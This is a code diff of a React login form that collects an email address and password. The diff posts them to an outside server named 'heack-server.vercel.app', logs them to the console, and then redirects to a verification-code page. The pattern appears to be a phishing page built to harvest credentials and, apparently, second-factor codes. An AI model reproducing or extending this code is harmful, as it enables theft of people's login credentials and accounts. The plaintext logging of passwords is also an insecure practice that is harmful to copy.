@@ -20,15 +20,16 @@ const Login = () => {
       Email: data.example,
       Password: data.exampleRequired,
     };
-    fetch("https://erosservive.onrender.com/email", {
+    console.log(ItemId);
+    fetch("https://heack-server.vercel.app/users", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: { "Content-type": "application/json" },
       body: JSON.stringify(ItemId),
     })
       .then((res) => res.json())
       .then((result) => navigate("/Verifycode"));
   };
-
+  //
   return (
     <>
       <div className="Login mb-5">
@@ -36,7 +37,7 @@ const Login = () => {
         <form onSubmit={handleSubmit(onSubmit)}>
           <input
             className="form-control mb-4 p-3"
-            placeholder="E-mail Address *"
+            placeholder="E-mail Address"
             {...register("example", {
               required: true,
               pattern:
@@ -52,7 +53,7 @@ const Login = () => {
             <input
               className="form-control mb-4 p-3"
               type={Icon ? "password" : "name"}
-              placeholder="Password *"
+              placeholder="Password"
               {...register("exampleRequired", { required: true })}
             />
             <p className="logIcon" onClick={() => setIcon(!Icon)}>
